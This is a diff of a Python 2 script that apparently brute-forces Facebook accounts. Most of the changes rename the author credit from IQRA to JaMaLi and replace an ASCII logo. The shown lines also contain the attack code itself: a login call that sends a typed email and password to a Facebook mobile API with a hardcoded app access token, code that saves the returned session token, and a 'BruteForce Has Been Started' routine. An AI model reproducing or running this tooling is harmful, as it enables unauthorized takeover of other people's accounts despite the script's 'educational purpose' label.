@@ -1,6 +1,6 @@
-#Script Given By IQRA
+#Script Given By JaMaLi
 #Script Is Given For Educational Purpose
-#Script Edited By @IQRA
+#Script Edited By JaMaLi
 #Utf-8 python 
 
 try:
@@ -10,8 +10,8 @@ try:
 except ImportError:
 	os.system("pip2 install requests")
 
-IQRA = ['Op Bolty
-IQRAchoice = random.choice(IQRA)
+JaMaLi = ['Op Bolty']
+JaMaLichoice = random.choice(JaMaLi)
 agents = [
  'Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0',
  'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36',
@@ -39,12 +39,13 @@ header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-f
 logo = """
 
 \033[0;92m\                        ,-.  .---. ,---.    .--.   
-|(| ( .-. \| .-.\  / /\ \  
-(_)(_)| | || `-'/ / /__\ \ 
-| | | ||\ ||   (  |  __  | 
-| | \ `-\\/| |\ \ | |  |)| 
-`-'  `---\||_| \)\|_|  (_) 
-               (__)             
+|(| ( .-. \| .-.\  /
+   ___      ___  ___      _     _ 
+  |_  |     |  \/  |     | |   (_)
+    | | __ _| .  . | __ _| |    _ 
+    | |/ _` | |\/| |/ _` | |   | |
+/\__/ / (_| | |  | | (_| | |___| |
+\____/ \__,_\_|  |_/\__,_\_____/_|   
 \n\033[0m----------------------------------
 \033[1;92mAuthor \033[1;93m: IQRA
 \033[1;92mFb \033[1;93m: IQRA
@@ -129,7 +130,7 @@ def log_fb():
         print ''
         uid = raw_input(' Email / id : ')
         passw = raw_input(' Password: ')
-        data = requests.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + passw + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&user-agent=Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=900,height=1600}&cpl=true', headers=header).text ##Thanks IQRA
+        data = requests.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + passw + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&user-agent=Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=900,height=1600}&cpl=true', headers=header).text ##Thanks SAMI
         q = json.loads(data)
         if 'access_token' in q:
             sav = open('access_token.txt', 'w')
@@ -347,7 +348,7 @@ def crack_select():
         print ''
         crack_select()
     print ' \x1b[1;91m  BruteForce Has Been Started'
-    print ' \x1b[1;94m  Wait Ids Will Appear Here \033[0m'#IQRA
+    print ' \x1b[1;94m  Wait Ids Will Appear Here \033[0m'#
     print 45 * '_'
     print ''
 
